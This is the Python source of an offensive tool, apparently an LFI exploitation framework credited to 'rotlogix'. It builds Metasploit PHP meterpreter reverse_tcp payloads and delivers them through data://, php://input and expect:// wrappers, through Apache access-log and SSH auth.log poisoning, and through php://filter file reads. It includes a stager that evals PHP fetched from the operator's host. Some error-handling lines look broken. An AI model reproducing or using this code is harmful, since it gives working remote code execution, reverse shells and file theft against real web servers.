__author__ = 'rotlogix'

from blessings import Terminal
from shell_generator import Generator
from msf import Payload
import sys
import time
import subprocess
import requests
import base64
import textwrap
import urlparse
from urllib import quote_plus
from os import system


t = Terminal()

stager_payload = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"


def msf_payload():

         # Arguments needed for Meterpreter
        lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
        lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")

        # Generate random shell name
        g = Generator()
        shell = g.generate()

        print(t.green(" [*] ") + "Generating Data Wrapper")
        progressbar()
        print(t.red(" [!] ") + "Success!")
        print(t.green(" [*] ") + "Generating Metasploit Payload")
        progressbar()

        # msfpayload arguments
        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)

        # Generate shell

        try:
            msf = subprocess.Popen(php, shell=True)
            msf.wait()
        except msf.returncode as msf_error:
            if msf_error != 0:
                print(t.red(" [!] ") + "Error Generating MSF Payload ")
            else:
                print(t.red(" [!] ") + "Success! ")
                print(t.red(" [!] ") + "Payload Is Located At: /tmp/{0}.php").format(shell)

        return lhost, lport, shell


def progressbar():

    bar_width = 70
    sys.stdout.write(t.green(" [*]  ") + " " * bar_width)
    sys.stdout.flush()
    sys.stdout.write("\b" * (bar_width + 1))

    for i in xrange(bar_width):
        time.sleep(0.01)
        sys.stdout.write(".")
        sys.stdout.flush()

    sys.stdout.write("\n")


class Data:

    def __init__(self, target, nostager):

        self.target = target
        self.nostager = nostager

    def execute_data(self):

            lhost, lport, shell = msf_payload()

            # Build payload
            if self.nostager:
                payload_file = open("/tmp/{0}.php".format(shell), "r")
                payload = payload_file.read()
                payload_file.close()
            else:
                payload = stager_payload.format(lhost, shell)

            encoded_payload = quote_plus(payload.encode('base64'))

            # Build data wrapper
            data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
            lfi = self.target + data_wrapper

            handle = Payload(lhost, lport, self.target, shell)
            handle.handler()

            if self.nostager:
                progressbar()
            else:
                # Assuming if there is a server running on port 8000 hosting from /tmp
                print(t.red(" [!] ") + "Is Your Server Running?")
                print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
                print(t.green(" [*] ") + "Downloading Shell")
                progressbar()

            raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
            # LFI payload that downloads the shell
            data_request = requests.get(lfi)

            # Try block for actual attack
            try:
                if data_request.status_code != 200:
                    print(t.red(" [!] ") + "Unexpected HTTP Response ")
                    sys.exit(1)
            except requests.exceptions.RequestException as data_error:
                print(t.red(" [!] ") + "HTTP Error")(data_error)


class Input:

    def __init__(self, target, nostager):

        self.target = target
        self.nostager = nostager

    def execute_input(self):

        lhost, lport, shell = msf_payload()

        # Build php payload
        wrapper = "php://input"
        url = self.target + wrapper

        if self.nostager:
            payload_file = open("/tmp/{0}.php".format(shell), "r")
            payload = payload_file.read()
            payload_file.close()
        else:
            payload = stager_payload.format(lhost, shell)

        handle = Payload(lhost, lport, self.target, shell)
        handle.handler()

        if self.nostager:
            progressbar()
        else:
            # Assuming if there is a server running on port 8000 hosting from /tmp
            print(t.red(" [!] ") + "Is Your Server Running?")
            print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
            print(t.green(" [*] ") + "Downloading Shell")
            progressbar()

        raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler Is Running ...")

        try:
            dr = requests.post(url, data=payload)
            if dr.status_code != 200:
                print t.red(" [*] Unexpected HTTP Response ")
                sys.exit(1)
        except requests.exceptions.RequestException as input_error:
            print t.red(" [*] HTTP Error ")(input_error)


class Expect:

    def __init__(self, target, nostager):

        self.target = target
        self.nostager = nostager

    def execute_expect(self):

        lhost, lport, shell = msf_payload()

        handle = Payload(lhost, lport, self.target, shell)
        handle.handler()

        # Build payload
        if self.nostager:
            payload_file = open("/tmp/{0}.php".format(shell),"r")
            payload = "expect://echo \""
            payload += quote_plus(payload_file.read().replace("\"", "\\\"").replace("$", "\\$"))
            payload += "\" | php"
            payload_file.close()
            progressbar()
        else:
            payload = "expect://echo \""+stager_payload.format(lhost, shell)+"\" | php"
            print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
            print(t.green(" [*] ") + "Downloading Shell")
            progressbar()
        lfi = self.target + payload

        raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")

        try:
            r = requests.get(lfi)
            if r.status_code != 200:
                print(t.red(" [!] Unexpected HTTP Response "))
                sys.exit(1)
        except requests.exceptions.RequestException as expect_error:
            print t.red(" [!] HTTP Error ")(expect_error)


class Logs:

    def __init__(self, target, location, nostager):

        self.target = target
        self.location = location  # /var/log/apache2/access.log
        self.nostager = nostager

    def execute_logs(self):

        lhost, lport, shell = msf_payload()

        handle = Payload(lhost, lport, self.target, shell)
        handle.handler()

        if self.nostager:
            payload_file = open("/tmp/{0}.php".format(shell),"r")
            payload = "<?php eval(base64_decode('{0}')); ?>".format(payload_file.read().encode('base64').replace("\n", ""))
            payload_file.close()
            progressbar()
        else:
            payload = stager_payload.format(lhost, shell)
            print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
            print(t.green(" [*] ") + "Downloading Shell")
            progressbar()
        lfi = self.target + self.location

        raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
        try:
            headers = {'User-Agent': payload}
            r = requests.get(lfi, headers=headers)
            if r.status_code != 200:
                print(t.red(" [!] Unexpected HTTP Response "))
            else:
                r = requests.get(lfi)  # pull down shell from poisoned logs
                if r.status_code != 200:
                    print(t.red(" [!] Unexpected HTTP Response "))
        except requests.exceptions.RequestException as access_error:
            print t.red(" [!] HTTP Error ")(access_error)


class SSHLogs:

    def __init__(self, target, location):

        self.target = target
        self.location = location  # /var/log/auth.log

    def execute_ssh(self):

        lhost, lport, shell = msf_payload()

        handle = Payload(lhost, lport, self.target, shell)
        handle.handler()

        payload_file = open('/tmp/{0}.php'.format(shell),'r')

        payload_stage2 = quote_plus(payload_file.read())
        payload_file.close()
        payload = "<?php eval(\\$_GET['code'])?>"
        print(t.blue(" [!] ") + "Enter fake passwords to perform SSH log poisoning...")
        host = urlparse.urlsplit(self.target).netloc
        system('/usr/bin/ssh "{0}@{1}"'.format(payload,host))

        print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
        print(t.green(" [*] ") + "Downloading Shell")
        progressbar()
        lfi = self.target + self.location + '&code={0}'.format(payload_stage2)

        try:
            r = requests.get(lfi)  # pull down shell from poisoned logs
            if r.status_code != 200:
                print(t.red(" [!] Unexpected HTTP Response "))
        except requests.exceptions.RequestException as access_error:
            print t.red(" [!] HTTP Error ")(access_error)


class Filter:

    def __init__(self, target):

        self.target = target

    def execute_filter(self):

        f_file = raw_input(t.green(" [*] ") + "Please Enter File To Read: ")   # filter file
        payload = "php://filter/convert.base64-encode/resource={0}".format(f_file)
        lfi = self.target + payload

        try:
            r = requests.get(lfi)
            if r.status_code != 200:
                print(t.red(" [!] Unexpected HTTP Response "))
            else:
                progressbar()
                try:
                    result = base64.b64decode(r.text)
                    print(t.red(" [!] ") + "Decoded: " + t.red(textwrap.fill(result)))  # needs better wrapping
                except TypeError as type_error:
                    print(t.red(" [!] ") + "Incorrect Padding - Check File!") + type_error  # handle padding issues
                    sys.exit(1)
        except requests.exceptions.RequestException as filter_error:
            print t.red(" [!] HTTP Error ")(filter_error)
